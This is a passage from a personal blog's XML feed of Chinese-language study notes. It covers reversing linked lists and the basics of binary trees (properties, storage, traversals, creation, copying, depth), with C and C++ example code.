class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">ReverseList</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* pHead )</span> &#123;<br>    <span class="hljs-comment">// write code here</span><br>    <span class="hljs-keyword">if</span>(pHead==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pre</span>=</span><span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">cur</span>=</span>pHead;<br>    <span class="hljs-keyword">while</span>(cur!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">temp</span>=</span>cur-&gt;next;<br>        cur-&gt;next=pre;<br>        pre=cur;<br>        cur=temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> pre;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>理解</p><ul><li>让<code>temp</code>保存<code>cur-&gt;next</code>的地址</li><li><code>pre</code>第一次要为NULL</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反转整个链表</title>
    <link href="/2023/04/10/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
    <url>/2023/04/10/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="!%5Bimage-20230410224210507%5D(C:%5CUsers%5C12414%5CDesktop%5Chexo%5Csource_posts%5C%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8.assets%5Cimage-20230410224210507.png)">题</a></p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8%E9%A2%98.png"></p><ol><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">ReverseList</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* pHead )</span> &#123;<br>    <span class="hljs-comment">// write code here</span><br>    <span class="hljs-keyword">if</span>(pHead==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pre</span>=</span><span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">cur</span>=</span>pHead;<br>    <span class="hljs-keyword">while</span>(cur!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">temp</span>=</span>cur-&gt;next;<br>        cur-&gt;next=pre;<br>        pre=cur;<br>        cur=temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> pre;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>理解</p><ul><li>让<code>temp</code>保存<code>cur-&gt;next</code>的地址</li><li><code>pre</code>第一次要为NULL</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表内指定区域反转</title>
    <link href="/2023/04/10/%E7%AE%97%E6%B3%95/newcoder/%E9%93%BE%E8%A1%A8%E5%86%85%E6%8C%87%E5%AE%9A%E5%8C%BA%E5%9F%9F%E5%8F%8D%E8%BD%AC/"/>
    <url>/2023/04/10/%E7%AE%97%E6%B3%95/newcoder/%E9%93%BE%E8%A1%A8%E5%86%85%E6%8C%87%E5%AE%9A%E5%8C%BA%E5%9F%9F%E5%8F%8D%E8%BD%AC/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/b58434e200a648c589ca2063f1faf58c?tpId=295&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/oj?page=1&tab=%E7%AE%97%E6%B3%95%E7%AF%87&topicId=295">链表内指定区间反转_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E9%83%A8%E5%88%86%E9%93%BE%E8%A1%A8%E9%A2%98.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstddef&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param head ListNode类</span><br><span class="hljs-comment">     * @param m int整型</span><br><span class="hljs-comment">     * @param n int整型</span><br><span class="hljs-comment">     * @return ListNode类</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseBetween</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>         ListNode* temHead=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//c++的创建方法，0是data域</span><br>        <span class="hljs-comment">//创建虚拟头节点</span><br>        <span class="hljs-comment">//操作头节点方便，比如如果反转第一个元素</span><br>         temHead-&gt;next=head;<br>        <br>        <br>         ListNode* pre=temHead;<br>         ListNode* cur=head;<br>        <span class="hljs-comment">//两个指针用于操作来链表</span><br>        <br>         ListNode* tem=<span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-comment">//用于存放cur-&gt;next</span><br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; ++i) &#123;<br>            pre=pre-&gt;next;<br>            cur=cur-&gt;next;<br>        &#125;<br>        <span class="hljs-comment">//使节点移动</span><br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;n-m;++i) &#123;<br>            tem=cur-&gt;next;<br>            cur-&gt;next=tem-&gt;next;<br>            <span class="hljs-comment">//始终让cur-&gt;next指向的使next-&gt;xext;</span><br>            <br>            <br>            tem-&gt;next=pre-&gt;next;<br>            <span class="hljs-comment">//让反转的指针，指向pre-&gt;next实现反转</span><br>            <br>            pre-&gt;next=tem;<br>            <span class="hljs-comment">//再让pre指向tem保持连接</span><br>            <br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> temHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E9%83%A8%E5%88%86%E9%93%BE%E8%A1%A8%E6%8F%90%E7%A4%BA.gif"></p></li><li><p>理解</p><ul><li>先遍历到反转区域</li><li>使用虚拟头节点</li></ul></li><li><p>问题</p><ul><li><p>为什么不用判断<code>cur-&gt;next-&gt;next</code>是不是越界？</p><blockquote><p>因为不会越界</p><p>如果使用的区域刚好是整个链表</p><p>那么当要反转最后一个节点的时候，也就是最后一次</p><p>cur-&gt;next-&gt;next&#x3D;<code>nullptr</code></p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>树和二叉树</title>
    <link href="/2023/04/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2023/04/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="树和二叉树"><a href="#树和二叉树" class="headerlink" title="树和二叉树"></a>树和二叉树</h1><h2 id="树的基本"><a href="#树的基本" class="headerlink" title="树的基本"></a>树的基本</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p><ol><li><p>一个根和若干的子树</p></li><li><p>基本术语</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91%2F%E6%A0%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD.png"></p></li><li><p>树的类别</p><ul><li><p>有序树</p><p>子树有位置要求</p></li><li><p>无序树</p><p>子树无要求</p><p>意思是：1，2，3，这三颗子树，无论如何排列都是一个树</p></li></ul></li><li><p>森林</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97.png"></p></li><li><p>树和线性结构的比较</p><ul><li>树是一对多</li><li>线性结构是一对一</li></ul></li></ol><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ol><li><p>每个节点最多有两个度</p></li><li><p>二叉树是个有序树（但是不是树的特殊情况）</p></li><li><p>二叉树可以是一 个空集 </p></li><li><p>二叉树必须要分左子树还是右子树，即使只有一颗子树也要分（但是树可以不分，所以这就是二叉树不是树的原因）</p></li><li><p>二叉树的基本形态</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%BD%A2%E6%80%81.png"></p></li><li><p>二叉树的抽象类型定义</p></li><li><p>二叉树的性质</p><ul><li><p>在二叉树的第<code>i</code>层最多有2^i-1^ 个节点，最少有一个</p></li><li><p>深度为<code>k</code>的二叉树最多有2^k^ -1个节点</p></li><li><p>对任何一颗二叉树T如果叶子树为n<del>0</del>&#x3D;n<del>2</del>+1</p></li></ul><p>  <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A83.png"></p><ul><li><p>B&#x3D;n-1</p><p>从下网上看，因为除了根节点每个节点都会产生一条边，所以<code>n-1</code>（除了根节点）个节点会产生<code>n-1</code>个边</p></li><li><p>n<del>2</del> *2 +n<del>1</del>*1</p><p>从上往下看，因为，每一个度为2的节点都会产生两条边，每一度为1的节点会产生一个边</p></li><li><p>满二叉树</p><ul><li>每一层都达到最大的节点数</li><li>叶子节点出现在最后一层</li></ul></li><li><p>完成二叉树</p><ul><li><p>二叉树中有编号的与满二叉树的标号对应</p></li><li><p>在满二叉树中去除立连续的节点，剩下的也是完全二叉树</p></li><li><p>满二叉树一定是完全二叉树</p></li><li><p>完全二叉树的性质</p><p>性质三</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A8.png"></p><p>性质四</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A8.png"></p></li></ul></li></ul></li><li><p>二叉树的存储结构  </p><ul><li>顺序结构</li><li>链式结构<ul><li>二叉链表</li><li>三叉链表</li></ul></li></ul></li><li><p>二叉树的链式存储的储存结构</p><p>二叉链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> *<span class="hljs-title">lChild</span>,*<span class="hljs-title">rChild</span>;</span><br>&#125;BiNode,*BiTree;<br></code></pre></td></tr></table></figure><p>三叉链表(多了一个指向双亲的指针)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> *<span class="hljs-title">lChild</span>,*<span class="hljs-title">parent</span>,*<span class="hljs-title">rChild</span>;</span><br>&#125;BiNode,*BiTree;<br><br></code></pre></td></tr></table></figure><ul><li>在<code>n</code>个节点的二叉链表中，必有<code>2n</code>个链域，除了根节点没有双亲，所以一定会有<code>n-1</code>个节点的链域存放指针，指向非空的子女节点。</li></ul><p>  所以一共有<code>n+1</code>个空指针域</p></li><li><p>二叉树的遍历</p></li></ol><ul><li><p>先序遍历</p><p>先访问根节点，再访问左子树，再访问右子树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86%E7%AE%97%E6%B3%95.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        visit(T);<br>        PreOrderTraverse(T-&gt;lChild);<br>        PreOrderTraverse(T-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>中序遍历</p><p>先访问左子树，再访问根节点，再访问右子树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        PreOrderTraverse(T-&gt;lChild);<br>        visit(T);<br>        PreOrderTraverse(T-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>后续遍历</p><p>先访问左子树，在访问右子树，最后访问根节点   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        PreOrderTraverse(T-&gt;lChild);<br>        PreOrderTraverse(T-&gt;rChild);<br>        visit(T);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>例题：</p><p>使用二叉树表达算术表达式</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%EF%BC%8C%E4%B8%AD%EF%BC%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.png"></p></li><li><p>递归遍历的算法分析</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%81%8D%E5%8E%86%E7%9A%84%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90.png" alt="img"></p><p>从虚线出发到每一个终点路径每个节点经历3次</p></li><li><p>非递归遍历</p><p>中序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E7%9A%84%E9%9D%9E%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stack&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TElemType char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><span class="hljs-function">status <span class="hljs-title">InOrderTraverse</span><span class="hljs-params">(BiTree&amp; T)</span></span>&#123;<br>    std::stack&lt;BiTree&gt; stack;<span class="hljs-comment">//申请一个栈</span><br>    BiTree moveNode=T;<br>    <span class="hljs-keyword">while</span>(!stack.<span class="hljs-built_in">empty</span>()||moveNode!= <span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">if</span>(moveNode!= <span class="hljs-literal">nullptr</span>)&#123;<br>            stack.<span class="hljs-built_in">push</span>(moveNode);<br>            moveNode=moveNode-&gt;lChild;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">auto</span> p=stack.<span class="hljs-built_in">top</span>();<span class="hljs-comment">//得到栈首的元素</span><br>            std::cout&lt;&lt;p-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            stack.<span class="hljs-built_in">pop</span>();<br>            moveNode=p-&gt;rChild;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br></code></pre></td></tr></table></figure></li><li><p>层次遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">status <span class="hljs-title">LeveIOrder</span><span class="hljs-params">(BiTree&amp; biTree)</span></span>&#123;<br>    std::queue&lt;BiTree&gt; queue;<br>    BiNode* pMove=biTree;<br>    queue.<span class="hljs-built_in">push</span>(biTree);<br>    <span class="hljs-keyword">while</span>(!queue.<span class="hljs-built_in">empty</span>())&#123;<br>        <span class="hljs-keyword">if</span>(queue.<span class="hljs-built_in">front</span>()-&gt;lChild!= <span class="hljs-literal">nullptr</span>)&#123;<br>            queue.<span class="hljs-built_in">push</span>(queue.<span class="hljs-built_in">front</span>()-&gt;lChild);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(queue.<span class="hljs-built_in">front</span>()-&gt;rChild!= <span class="hljs-literal">nullptr</span>)&#123;<br>            queue.<span class="hljs-built_in">push</span>(queue.<span class="hljs-built_in">front</span>()-&gt;rChild);<br>        &#125;<br>        std::cout&lt;&lt;queue.<span class="hljs-built_in">front</span>()-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><ol start="11"><li><p>二叉树的创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">CreatBitree</span><span class="hljs-params">(BiTree* biTree)</span>&#123;<br>    TElemType ch;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,&amp;ch);<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;#&#x27;</span>)&#123;<br>        <span class="hljs-keyword">return</span> OK;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        (*biTree)=(BiNode*) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiNode));<br>        (*biTree)-&gt;lChild=<span class="hljs-literal">NULL</span>;<br>        (*biTree)-&gt;rChild=<span class="hljs-literal">NULL</span>;<br>        (*biTree)-&gt;data=ch;<br>        CreatBitree(&amp;(*biTree)-&gt;lChild);<br>        CreatBitree(&amp;(*biTree)-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><p>定义：</p><p>‘#’代表没有节点</p></li></ul><p>所以上面代码的实现是，根据符号来确定是否要创建一个二叉树</p></li><li><p>二叉树的复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">Copy</span><span class="hljs-params">(BiTree T, BiTree *newBitree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (T != <span class="hljs-literal">NULL</span>) &#123;<br>        *newBitree = (BiTree) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiNode));<br>        (*newBitree)-&gt;lChild=<span class="hljs-literal">NULL</span>;<br>        (*newBitree)-&gt;rChild=<span class="hljs-literal">NULL</span>;<br>        (*newBitree)-&gt;data=T-&gt;data;<br>        Copy(T-&gt;lChild,&amp;(*newBitree)-&gt;lChild);<br>        Copy(T-&gt;rChild,&amp;(*newBitree)-&gt;rChild);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算二叉树的深度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Depen</span><span class="hljs-params">(BiTree biTree)</span>&#123;<br>    <span class="hljs-keyword">if</span>(biTree==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        m= Depen(biTree-&gt;lChild);<br>        n= Depen(biTree-&gt;rChild);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(n&gt;m)&#123;<br>        <span class="hljs-keyword">return</span> (n+<span class="hljs-number">1</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> m+<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算二叉树的节点数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 